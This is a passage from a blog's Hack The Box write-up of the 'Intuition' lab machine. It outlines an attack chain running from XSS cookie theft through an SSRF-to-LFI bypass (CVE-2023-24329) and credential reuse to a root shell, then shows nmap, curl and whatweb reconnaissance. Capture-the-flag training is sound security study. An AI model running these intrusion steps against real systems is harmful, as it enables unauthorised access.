<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta charset='utf-8'>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="index, follow">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
    crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
    crossorigin="anonymous"></script>
  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
  <script type="text/javascript" async
    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
    </script>
  <link rel="stylesheet" href="/assets/css/style.css?v=7ff8f0668b3e979f46af8dc42fec356e12b6d503">
  <link rel="stylesheet" href="/assets/css/prism.css">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
  
  <meta name="theme-color" content="#000000" />
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HTB Intuition writeup | Gabriel blog</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="HTB Intuition writeup" />
<meta name="author" content="gabri47" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Intuition is a linux hard machine with a lot of steps involved. First, I will abuse a web application vulnerable to XSS to retrieve adam’s and later admin’s cookies. From admin panel, I will exploit CVE-2023–24329 to bypass url scheme restrictions in a “Create Report PDF” functionality and have LFI (file://) from the SSRF. I will use the LFI to analyze the source code of the flask application and see it’s using a ftp credential for doing backup. With that ftp credential I will use the ftp:// wrapper and see a ssh private key with a welcome_note that says the private key passphrase that I can use to connect to ssh as dev_acc. From there, I will see an users.db sqlite file with the hash of user adam which I can crack and use for the ftp service to see some backup files of a binary called “runner1”. Then, in the logs of suricata, I can see a credential used for user lopez in ftp that I can use to ssh as lopez. This lopez user has a sudoers privilege that lets him run /opt/runner2/runner2 as any user he wants. Analyzing the binary with ghidra, I can see that it’s calling a system function without sanitization with a user-controlled input and I can execute a bash shell as root." />
<meta property="og:description" content="Intuition is a linux hard machine with a lot of steps involved. First, I will abuse a web application vulnerable to XSS to retrieve adam’s and later admin’s cookies. From admin panel, I will exploit CVE-2023–24329 to bypass url scheme restrictions in a “Create Report PDF” functionality and have LFI (file://) from the SSRF. I will use the LFI to analyze the source code of the flask application and see it’s using a ftp credential for doing backup. With that ftp credential I will use the ftp:// wrapper and see a ssh private key with a welcome_note that says the private key passphrase that I can use to connect to ssh as dev_acc. From there, I will see an users.db sqlite file with the hash of user adam which I can crack and use for the ftp service to see some backup files of a binary called “runner1”. Then, in the logs of suricata, I can see a credential used for user lopez in ftp that I can use to ssh as lopez. This lopez user has a sudoers privilege that lets him run /opt/runner2/runner2 as any user he wants. Analyzing the binary with ghidra, I can see that it’s calling a system function without sanitization with a user-controlled input and I can execute a bash shell as root." />
<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Intuition.html" />
<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Intuition.html" />
<meta property="og:site_name" content="Gabriel blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-09-14T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HTB Intuition writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-09-14T00:00:00+02:00","datePublished":"2024-09-14T00:00:00+02:00","description":"Intuition is a linux hard machine with a lot of steps involved. First, I will abuse a web application vulnerable to XSS to retrieve adam’s and later admin’s cookies. From admin panel, I will exploit CVE-2023–24329 to bypass url scheme restrictions in a “Create Report PDF” functionality and have LFI (file://) from the SSRF. I will use the LFI to analyze the source code of the flask application and see it’s using a ftp credential for doing backup. With that ftp credential I will use the ftp:// wrapper and see a ssh private key with a welcome_note that says the private key passphrase that I can use to connect to ssh as dev_acc. From there, I will see an users.db sqlite file with the hash of user adam which I can crack and use for the ftp service to see some backup files of a binary called “runner1”. Then, in the logs of suricata, I can see a credential used for user lopez in ftp that I can use to ssh as lopez. This lopez user has a sudoers privilege that lets him run /opt/runner2/runner2 as any user he wants. Analyzing the binary with ghidra, I can see that it’s calling a system function without sanitization with a user-controlled input and I can execute a bash shell as root.","headline":"HTB Intuition writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Intuition.html"},"url":"http://localhost:4000/writeups/2024/HTB/Intuition.html"}</script>
<!-- End Jekyll SEO tag -->

  
</head>

<body>

  <div id="header">
    <div class="container">
      <div class="title-container">
        <a id="a-title" href="/">
          <h1>Gabriel blog</h1>
        </a>
        <small class="nav-main d-flex justify-content-center">
    
    <a href = "/writeups">Writeups</a>
    
    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
    
    
    <a href = "/blog">Blog</a>
    
    
</small>

      </div>
      <br>

      
      
<nav class="navbar navlinks">
    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
        <span>HTB Writeups</span>
        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
    </button>

    <div class="navbar-collapse collapse" id="navbarSupportedContent">
        <div class="m-1 mt-2">

            
            
            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Boardlight.html"> HTB Boardlight writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Solarlab.html"> HTB Solarlab writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Intuition.html"> HTB Intuition writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Mailing.html"> HTB Mailing writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Skyfall.html"> HTB Skyfall writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Runner.html"> HTB Runner writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/FormulaX.html"> HTB FormulaX writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Usage.html"> HTB Usage writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/IClean.html"> HTB IClean writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Headless.html"> HTB Headless writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Corporate.html"> HTB Corporate writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Perfection.html"> HTB Perfection writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Jab.html"> HTB Jab writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Office.html"> HTB Office writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Crafty.html"> HTB Crafty writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Pov.html"> HTB Pov Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Analysis.html"> HTB Analysis Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Bizness.html"> HTB Bizness Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Ouija.html"> HTB Ouija Writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Monitored.html"> HTB Monitored Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HTB Napper Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HTB Surveillance writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HTB Hospital Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            

            
            
            
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HTB Codify Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
                        </small>
                    </span>
                </li>
                
                
            </ul>

            
            

            
            

        </div>
    </div>
</nav>

      
      <div id="bottom-bar">
        <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

      </div>
    </div>
  </div>

  <div id="content" class="container">
    <section id="main_content">
      <h5 class="mt-0 mb-2">
        
        
          HTB
        
        
      </h5>
    
      <h1 class="d-flex w-100 justify-content-between">
        
        
          <span>HTB Intuition writeup</span> <span class="points"> [40 pts] </span>
        
        
      </h1>


<script>

</script>


<p>Intuition is a linux hard machine with a lot of steps involved. First, I will abuse a web application vulnerable to XSS to retrieve adam’s and later admin’s cookies. From admin panel, I will exploit <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-24329">CVE-2023–24329</a> to bypass url scheme restrictions in a “Create Report PDF” functionality and have LFI (file://) from the SSRF. I will use the LFI to analyze the source code of the flask application and see it’s using a ftp credential for doing backup. With that ftp credential I will use the ftp:// wrapper and see a ssh private key with a welcome_note that says the private key passphrase that I can use to connect to ssh as dev_acc. From there, I will see an users.db sqlite file with the hash of user adam which I can crack and use for the ftp service to see some backup files of a binary called “runner1”. Then, in the logs of suricata, I can see a credential used for user lopez in ftp that I can use to ssh as lopez. This lopez user has a sudoers privilege that lets him run /opt/runner2/runner2 as any user he wants. Analyzing the binary with ghidra, I can see that it’s calling a system function without sanitization with a user-controlled input and I can execute a bash shell as root.</p>
    
      <h1 id="port-recognaissance">
        
        
          Port recognaissance <a href="#port-recognaissance" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>

<pre><code class="language-python">❯ sudo nmap -sS -sVC -p- --open --min-rate 5000 -v -n -Pn 10.10.11.15 -oA intuition
# Nmap 7.94SVN scan initiated Fri Sep  6 17:16:30 2024 as: nmap -sS -sVC -p- --open --min-rate 5000 -v -n -Pn -oA intuition 10.10.11.15
Nmap scan report for 10.10.11.15
Host is up (0.041s latency).
Not shown: 63850 closed tcp ports (reset), 1683 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  6 17:16:50 2024 -- 1 IP address (1 host up) scanned in 20.36 seconds
</code></pre>
<ul>
  <li><code>-sVC</code>: Identifies service and version.</li>
  <li><code>-p-</code>: scans all the range of ports (1-65535).</li>
  <li><code>--open</code>: shows only open ports and not filtered or closed.</li>
  <li><code>-sS</code>: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
  <li><code>--min-rate 5000</code>: Sends 5000 packets per second to improve velocity (don’t do this in a real environment).</li>
  <li><code>-n</code>: Disables DNS resolution protocol.</li>
  <li><code>-v</code>: Enables verbose to see which ports are opened while it’s scanning</li>
  <li><code>-Pn</code>: Disables host discovery protocol (ping).</li>
  <li><code>-oA &lt;file&gt;</code>: Exports the evidence to multiple files in different formats.</li>
</ul>
    
      <h2 id="port-80">
        
        
          Port <strong>80</strong>: <a href="#port-80" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h2>
<p>It consists on a http port and it redirects to comprezzor.htb, so I will append this line to my /etc/hosts file for my linux system to know which IP should solve that domain:</p>

<pre><code class="language-plaintext">10.10.11.15 comprezzor.htb
</code></pre>
<p>Also, I noticed that nginx/1.18.0 is the server used.</p>
    
      <h2 id="port-22">
        
        
          Port <strong>22</strong>: <a href="#port-22" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h2>
<p>OpenSSH, useful when I get credentials/id_rsa but I don’t have nothing right now.</p>
    
      <h1 id="web-enumeration">
        
        
          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>
<p>Taking a look with curl, I don’t see nothing that nmap hasn’t detected yet:</p>

<pre><code class="language-bash">❯ curl -i -s http://comprezzor.htb | head
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Sep 2024 16:02:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3408
Connection: keep-alive

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
</code></pre>

<p>The tool whatweb (to identify technologies on the webpage) neither shows nothing more that an email “support@comprezzor.htb”:</p>

<pre><code class="language-bash">❯ whatweb http://comprezzor.htb
http://comprezzor.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[support@comprezzor.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.15], Script, Title[Comprezzor], nginx[1.18.0]
</code></pre>

<p>In the browser, I can see it’s a compression service:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906180701.png" alt="" /></p>

<p>There’s also a link in the bottom for reporting bugs going to report.comprezzor.htb, a new subdomain:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906180856.png" alt="" /></p>

<p>I will add it to my /etc/hosts and enumerate it when I finish with this web.
Uploading a file just gives me the compressed file bytes and downloads it because the header “Content-Disposition: attachment; filename=test.txt.xz”:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906181225.png" alt="" /></p>

<p>As said in the web, the accepted files are docx, pdf and txt so I will try uploading a php file so in case the webserver interprets php and I somehow manage to know the route where that file is saved, be able to execute code. But it’s different response and it redirects to / to show an error (the error is shown when I introduce the cookie it tries to set with Set-Cookie):</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906181620.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906181842.png" alt="" /></p>

<p>I could try putting one of the allowed extensions but before the extension I want (.php) to see if the server is programmed in a way that it just looks for the txt, pdf or docx string but it doesn’t validate if it really ends in it. But it doesn’t works:
<img src="/assets/images/Intuition/Pasted%20image%2020240906182034.png" alt="" /></p>

<p>For now, nothing interesting here so I will look the another subdomain I saw in the main page (report.comprezzor.htb). Looking with curl, I don’t see nothing interesting in the headers, only that it uses nginx:</p>

<pre><code class="language-bash">❯ curl -i -s http://report.comprezzor.htb | less
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Sep 2024 16:22:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3166
Connection: keep-alive
